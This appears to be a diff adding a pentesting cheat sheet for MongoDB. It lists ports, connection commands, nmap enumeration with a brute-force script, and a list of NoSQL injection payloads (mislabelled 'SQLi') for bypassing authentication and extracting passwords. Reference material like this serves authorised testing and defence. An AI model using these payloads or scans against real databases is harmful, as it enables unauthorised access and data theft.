@@ -1,0 +1,70 @@
+# MongoDB
+MongoDB is an open source database management system that uses a document-oriented database model to handle diverse forms of data. 
+It offers flexibility and scalability for managing unstructured or semi-structured data in applications like big data analytics and content management.
+
+## Ports
+```
+27017 Default #1
+27018 Default #2
+```
+
+## Connection
+
+```bash
+mongo -u <username> -p <password> <auth_source>
+mongo "mongodb://USERNAME:PASSWORD@IP:PORT/SOURCE?mechanism=DEFAULT&authSource=SOURCE"
+mongo "mongodb://HOST:PORT"
+mongo <HOST> 
+mongo <HOST>:<PORT> 
+mongo <HOST>:<PORT>/<DB> 
+mongo <database> -u <username> -p '<password>'
+```
+
+## Commands
+
+```
+show dbs
+use <db>
+show collections
+db.<collection>.find()
+db.<collection>.count()
+db.current.find({"username":"admin"})
+```
+
+# Enumeration
+## Remote
+```bash
+nmap -sV --script "mongo* and default" -p 27017 <IP>
+
+# Check if credentials are needed
+nmap -n -sV --script mongodb-brute -p 27017 <IP>
+```
+
+# Payloads for SQLi
+
+```
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';return 'a'=='a' && ''=='
+";return(true);var xyz='a
+0;return true
+```
+
+
+# References
+- [https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html](https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html)
